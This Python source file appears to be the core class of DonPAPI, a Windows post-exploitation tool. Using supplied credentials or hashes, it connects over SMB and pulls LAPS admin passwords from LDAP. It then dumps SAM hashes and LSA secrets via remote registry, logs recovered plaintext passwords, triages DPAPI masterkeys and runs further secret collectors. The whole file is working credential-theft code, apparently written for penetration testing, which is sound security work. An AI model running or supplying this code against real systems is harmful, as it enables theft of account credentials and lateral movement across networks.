import argparse
import json
import ntpath
import os
from typing import Dict, List
from impacket.dcerpc.v5 import rrp
from donpapi.lib.config import DEFAULT_CUSTOM_SHARE, DonPAPIConfig
from donpapi.lib.database import Database
from donpapi.lib.secretsdump import DonPAPIRemoteOperations, LSADump, SAMDump
from dploot.lib.target import Target
from dploot.lib.smb import DPLootSMBConnection
from dploot.triage.masterkeys import MasterkeysTriage, Masterkey

from donpapi.lib.logger import DonPAPIAdapter
from donpapi.lib.paths import DPP_LOOT_DIR_NAME


class DonPAPICore:
    def __init__(self, options: argparse.Namespace, db: Database, target: str, collectors: List, pvkbytes: bytes, plaintexts: Dict[str,str], nthashes: Dict[str,str], masterkeys: List[Masterkey], donpapi_config: DonPAPIConfig, false_positive: list, max_filesize: int, output_dir:str) -> None:
        self.options = options
        self.db = db
        self.host = target
        self.collectors = collectors
        self.pvkbytes = pvkbytes
        self.plaintexts = plaintexts
        self.nthashes = nthashes
        self.masterkeys = masterkeys
        self.donpapi_config = donpapi_config

        self.share = DEFAULT_CUSTOM_SHARE
        self.remoteops_allowed = not options.no_remoteops
        
        self.global_output_dir = os.path.join(output_dir, DPP_LOOT_DIR_NAME)
        self.target_output_dir = os.path.join(output_dir, DPP_LOOT_DIR_NAME, self.host)
        os.makedirs(self.target_output_dir, exist_ok=True)

        self.false_positive = false_positive
        self.max_filesize = max_filesize
        
        self.dploot_conn = None
        self.dpp_remoteops = None
        self.bootkey = None
        self._users = None
        self._is_admin = None
        self.sam_dump = None
        self.lsa_dump = None
        self.dpapi_systemkey = None
        self.hostname = None
        self.dploot_target = Target.create(
            domain=options.domain,
            username=options.username if options.username is not None else "",
            password=options.password if options.password is not None else "",
            target=self.host,
            lmhash=options.lmhash if options.lmhash is not None else "",
            nthash=options.nthash if options.nthash is not None else "",
            do_kerberos=options.k or options.aesKey,
            no_pass=True,
            aesKey=options.aesKey,
            use_kcache=options.k,
        )
        self.logger = DonPAPIAdapter()
        if not self.init_connection():
            return
        if self.options.laps:
            hostname = self.dploot_conn.smb_session.getServerName()
            password = self.get_laps_pass(hostname)
            if len(password)>=1:
                password = password[0][2]
                if password is not None:
                    self.dploot_target = Target.create(
                        domain='.',
                        username=self.options.laps,
                        password=password,
                        target=self.host,
                        lmhash="",
                        nthash="",
                        do_kerberos=False,
                        no_pass=False,
                        aesKey=None,
                        use_kcache=False,
                    )

                    if not self.init_connection():
                        return
            else:
                self.logger.debug(f"Could not find LAPS entry for {hostname}")

        self.host = self.dploot_conn.smb_session.getRemoteHost()
        self.hostname = self.dploot_conn.smb_session.getServerName()
        self.db.add_computer(
            ip=self.host,
            hostname=self.hostname,
            domain=self.dploot_conn.smb_session.getServerDNSDomainName(),
            dc="SYSVOL" in [s["shi1_netname"].rstrip("\x00") for s in self.dploot_conn.smb_session.listShares()] # dirty 
        )

        self.setup_logger()
        self.logger.debug(self.dploot_target)
        if self.is_admin:
            self.run()

    def setup_logger(self):
        self.logger.extra={
                "host": self.host,
                "hostname": self.hostname,
            }
        
    def init_connection(self):
        self.dploot_conn = DPLootSMBConnection(self.dploot_target)
        if self.dploot_conn.connect() is None:
            self.logger.debug("Could not connect to %s" % self.dploot_target.address)
            return False
        return True
    
    def enable_remoteops(self):
        if self.dploot_conn is not None and self.remoteops_allowed:
            try:
                if self.dpp_remoteops is None:
                    self.dpp_remoteops = DonPAPIRemoteOperations(
                        smb_connection=self.dploot_conn.smb_session,
                        logger=self.logger,
                        share_name=self.donpapi_config.custom_share,
                        file_extension=self.donpapi_config.custom_file_extension,
                        filename_regex=self.donpapi_config.custom_filename_regex,
                        remote_filepath=self.donpapi_config.custom_remote_filepath,
                    )
                    self.dpp_remoteops.enableRegistry()
                if self.bootkey is None:
                    self.bootkey = self.dpp_remoteops.getBootKey()
            except Exception as e:
                self.logger.error(f"Error while enabling remoteops: {e}")

    def reg_query_value(self,path,key):
        ans = None
        if self.dpp_remoteops is None:
            self.enable_remoteops()
        if path[:4] == "HKCU":
            path = path[5:]
            ans = rrp.hOpenCurrentUser(self.dpp_remoteops._DonPAPIRemoteOperations__rrp)
        else:
            if path[:4] == "HKLM":
                path = path[5:]
            ans = rrp.hOpenLocalMachine(self.dpp_remoteops._DonPAPIRemoteOperations__rrp)
        reg_handle = ans["phKey"]
        ans = rrp.hBaseRegOpenKey(
            self.dpp_remoteops._DonPAPIRemoteOperations__rrp,
            reg_handle,
            path,
        )
        key_handle = ans["phkResult"]
        value = rrp.hBaseRegQueryValue(self.dpp_remoteops._DonPAPIRemoteOperations__rrp, key_handle, key)
        return value

    def dump_sam(self) -> Dict[str,str]:
        if self.sam_dump is not None:
            return self.sam_dump
        self.enable_remoteops()
        samdump = SAMDump(remote_ops=self.dpp_remoteops, bootkey=self.bootkey)
        try:
            samdump.dump()
            samdump.save_to_db(self.db, self.host)
            self.sam_dump = samdump
        except:
            self.logger.fail("Could not dump SAM.")
        return self.sam_dump
    
    def dump_lsa(self) -> Dict[str,str]:
        if self.lsa_dump is not None:
            return self.lsa_dump
        self.enable_remoteops()
        lsadump = LSADump(remote_ops=self.dpp_remoteops, bootkey=self.bootkey)
        try:
            lsadump.dump()
            lsadump.save_secrets_to_db(self.db, self.host)
            self.lsa_dump = lsadump
        except:
            self.logger.fail("Could not dump LSA")
        return self.lsa_dump
    
    def get_laps_pass(self, hostname):
        from impacket.ldap import ldap, ldapasn1
        results = None
        try:
            base_dn = 'dc='
            base_dn += ",dc=".join(self.dploot_target.domain.split('.'))
            ldap_filter = "(&(objectCategory=computer)(|(msLAPS-EncryptedPassword=*)(ms-MCS-AdmPwd=*)(msLAPS-Password=*))(sAMAccountName=" + hostname + "$))"
            attributes = [
                "msLAPS-EncryptedPassword",
                "msLAPS-Password",
                "ms-MCS-AdmPwd",
                "sAMAccountName",
            ]
            ldap_url = f"ldap://{self.dploot_target.domain}"
            ldap_connection = ldap.LDAPConnection(ldap_url, base_dn)
            if self.dploot_target.use_kcache:
                # Kerberos connection
                ldap_connection.kerberosLogin(
                    self.dploot_target.username,
                    self.dploot_target.password,
                    self.dploot_target.domain,
                    self.dploot_target.lmhash,
                    self.dploot_target.nthash,
                    self.dploot_target.aesKey,
                    useCache=self.dploot_target.use_kcache,
                )
            else:
                # NTLM connection
                ldap_connection.login(
                    self.dploot_target.username,
                    self.dploot_target.password,
                    self.dploot_target.domain,
                    self.dploot_target.lmhash,
                    self.dploot_target.nthash,
                )
            results = ldap_connection.search(
                searchFilter=ldap_filter,
                attributes=attributes,
                sizeLimit=0,
            )  
        except Exception as e:
            self.logger.error(f"Exception while requesting LAPS passwords: {e}")
        
        # Great code from NXC
        results = [r for r in results if isinstance(r, ldapasn1.SearchResultEntry)]
        laps_computers = []
        if len(results) != 0:
            for computer in results:
                values = {str(attr["type"]).lower(): attr["vals"][0] for attr in computer["attributes"]}
                if "mslaps-encryptedpassword" in values:
                    self.logger.debug("LAPSv2 hashes detected, not supported yet.")
                elif "mslaps-password" in values:
                    r = json.loads(str(values["mslaps-password"]))
                    laps_computers.append((str(values["samaccountname"]), r["n"], str(r["p"])))
                elif "ms-mcs-admpwd" in values:
                    laps_computers.append((str(values["samaccountname"]), "", str(values["ms-mcs-admpwd"])))
                else:
                    self.logger.debug("No result found with attribute ms-MCS-AdmPwd or msLAPS-Password")
        else:
            self.logger.fail("Could not retrieve LAPS passwords from LDAP")
        laps_pass = sorted(laps_computers, key=lambda x: x[0])
        return laps_pass

    def get_masterkeys(self):
        masterkeys = []
        try:
            masterkeys_triage = MasterkeysTriage(
                target=self.dploot_target,
                conn=self.dploot_conn,
                pvkbytes=self.pvkbytes,
                passwords=self.plaintexts,
                nthashes=self.nthashes,
                dpapiSystem=self.dpapi_systemkey,
            )
            masterkeys += masterkeys_triage.triage_masterkeys()
            if self.remoteops_allowed and self.lsa_dump is not None:
                masterkeys += masterkeys_triage.triage_system_masterkeys() 
        except Exception as e:
            self.logger.debug(f"Could not get masterkeys: {e}")
        self.masterkeys += masterkeys

    def run(self):
        self.logger.display("Starting gathering credz")
        if self.remoteops_allowed:
            # Dump SAM
            self.logger.display("Dumping SAM")
            self.dump_sam()
            if hasattr(self.sam_dump, "items_found") and self.sam_dump.items_found is not None:
                self.logger.secret(f"Got {len(self.sam_dump.items_found)} accounts", "SAM")
            else:
                self.logger.fail(f"No account found in SAM (maybe blocked by EDR)")
            
            # Dump LSA
            self.logger.display("Dumping LSA")
            self.dump_lsa()
            if self.lsa_dump is not None:
                if self.lsa_dump.secrets:
                    for secret in self.lsa_dump.secrets:
                        if secret.count(':')==1:
                            username, password = secret.split(':')
                            if username not in ["dpapi_machinekey", "dpapi_userkey", "NL$KM", "ASP.NETAutoGenKeys"]:
                                if username not in self.plaintexts:
                                    self.plaintexts[username] = [password]
                                self.logger.secret(f"{username}:{password}","LSA")
                    
                    self.logger.verbose(f"Got {len(self.lsa_dump.secrets)} LSA secrets")
                    # Getting DPAPI Machine keys
                    self.dpapi_systemkey = self.lsa_dump.get_dpapiSystem_keys()
            else :
                self.logger.fail(f"No secret found in LSA (maybe blocked by EDR)")

        # Get Masterkeys
        self.logger.display(f"Dumping User{' and Machine ' if self.remoteops_allowed else ' '}masterkeys")
        self.get_masterkeys()
        if len(self.masterkeys) == 0 or self.masterkeys is None:
            self.logger.fail("No masterkeys looted")
        else:    
            self.logger.secret(f"Got {len(self.masterkeys)} masterkeys", "DPAPI")

        for collector in self.collectors:
            try:
                collector(
                    self.dploot_target, 
                    self.dploot_conn, 
                    self.masterkeys, 
                    self.options, 
                    self.logger, 
                    self,
                    self.false_positive, 
                    self.max_filesize
                ).run()
            except Exception as e:
                self.logger.fail(f"Error during {collector.__name__}: {e}")

        # Get yadayadayada
        self.logger.verbose("Finished thread")

    @property
    def is_admin(self) -> bool:
        if self._is_admin is not None:
            return self._is_admin
        self._is_admin = self.dploot_conn.is_admin()
        return self._is_admin
    
    @property
    def users(self) -> List[str]:
        if self._users is not None:
            return self._users
        
        users = list()
        false_positive = ['.','..', 'desktop.ini','Public','Default','Default User','All Users']
        users_dir_path = 'Users\\*'
        directories = self.dploot_conn.listPath(shareName=self.share, path=ntpath.normpath(users_dir_path))
        for d in directories:
            if d.get_longname() not in false_positive and d.is_directory() > 0:
                users.append(d.get_longname())
    
        self._users = users

        return self._users
